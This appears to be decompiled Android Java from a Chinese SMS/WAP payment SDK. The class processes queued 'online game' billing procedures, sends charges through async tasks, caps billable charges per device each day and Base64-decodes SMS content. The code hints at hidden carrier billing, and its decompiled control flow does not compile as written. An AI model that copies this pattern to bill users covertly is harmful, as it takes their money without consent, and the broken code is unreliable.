package com.zhangzhifu.sdk.onlinegame;

import android.content.Context;
import android.util.Base64;
import com.zhangzhifu.sdk.ZhangPayCallback;
import com.zhangzhifu.sdk.db.OnlineGameWapDBManager;
import com.zhangzhifu.sdk.db.SharePreferUtil;
import com.zhangzhifu.sdk.modle.OnlineProcedure;
import com.zhangzhifu.sdk.modle.OnlineWap;
import com.zhangzhifu.sdk.util.JudgeTimeUtil;
import com.zhangzhifu.sdk.util.ZhangPayLog;
import com.zhangzhifu.sdk.util.json.MsgResponse;
import java.util.Iterator;
import java.util.List;

public class ZhangPayOGF
{
  public static int allFlow;
  private static ZhangPayOGF ct;
  public static String currentWapUrl;
  private String bA;
  private Context bZ;
  public int count;
  private OnlineProcedure cu;
  private MsgResponse cv;
  public boolean isSend = false;
  public boolean isSendNext = false;
  public ZhangPayCallback zhangPayCallback;
  
  public ZhangPayOGF(Context paramContext)
  {
    this.bZ = paramContext;
  }
  
  public static ZhangPayOGF getInstance(Context paramContext)
  {
    if (ct == null) {
      ct = new ZhangPayOGF(paramContext);
    }
    return ct;
  }
  
  public void deelOnlineGameWap(List paramList)
  {
    if ((paramList != null) && (paramList.size() > 0)) {
      paramList = paramList.iterator();
    }
    for (;;)
    {
      if (!paramList.hasNext()) {
        return;
      }
      OnlineWap localOnlineWap = (OnlineWap)paramList.next();
      if (!JudgeTimeUtil.isMax(2, this.bZ)) {
        break;
      }
      if (localOnlineWap == null)
      {
        ZhangPayLog.d("zhangPay_log", "计费失败");
      }
      else if ((localOnlineWap.getAllProcedure() != null) && (localOnlineWap.getAllProcedure().size() != 0))
      {
        ZhangPayLog.d("OnlineGameFee", "发短信的时间开始");
        new e(this, localOnlineWap).execute(new String[] { "" });
        OnlineGameWapDBManager.getInstance().delWapById(this.bZ, localOnlineWap);
      }
    }
    SharePreferUtil.getInstance().setSmsResult(this.bZ, 1005);
    ZhangPayLog.d("zhangPay_log", "该设备今日已超过可计费次数上限");
  }
  
  public byte[] getSmsContent(String paramString)
  {
    if (paramString != null) {
      return Base64.decode(paramString, 0);
    }
    return null;
  }
}
